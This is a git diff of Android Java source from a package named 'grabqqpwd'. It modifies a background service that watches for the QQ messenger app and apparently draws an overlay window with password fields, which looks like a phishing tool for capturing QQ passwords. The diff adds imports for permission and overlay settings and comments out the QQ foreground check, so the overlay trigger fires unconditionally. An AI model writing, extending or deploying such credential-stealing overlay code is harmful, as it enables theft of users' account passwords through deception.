@@ -1,16 +1,21 @@
 package com.android.grabqqpwd;
 
+import android.Manifest;
 import android.app.ActivityManager;
 import android.app.Service;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.graphics.PixelFormat;
 import android.graphics.Rect;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Message;
+import android.provider.Settings;
+import android.support.v4.content.ContextCompat;
 import android.text.TextUtils;
 import android.text.method.HideReturnsTransformationMethod;
 import android.text.method.PasswordTransformationMethod;
@@ -27,6 +32,7 @@ import android.widget.EditText;
 import com.jaredrummler.android.processes.ProcessManager;
 
 import java.lang.reflect.Field;
+import java.security.Permission;
 import java.util.List;
 
 /**
@@ -36,6 +42,7 @@ import java.util.List;
  * @since 2016-01-08
  */
 public class BackgroundDetectService extends Service implements View.OnClickListener{
+    private static final int REQUEST_CODE = 1;
 
     WindowManager windowManager;
     RelativeLayoutWithKeyDetect v;
@@ -63,9 +70,9 @@ public class BackgroundDetectService extends Service implements View.OnClickList
                     } catch (InterruptedException e) {
                         e.printStackTrace();
                     }
-                    if (isAppForeground("com.tencent.mobileqq")){
+//                    if (isAppForeground("com.tencent.mobileqq")){
                         myHandler.sendEmptyMessage(1);
-                    }
+//                    }
                 }
             }
         }).start();
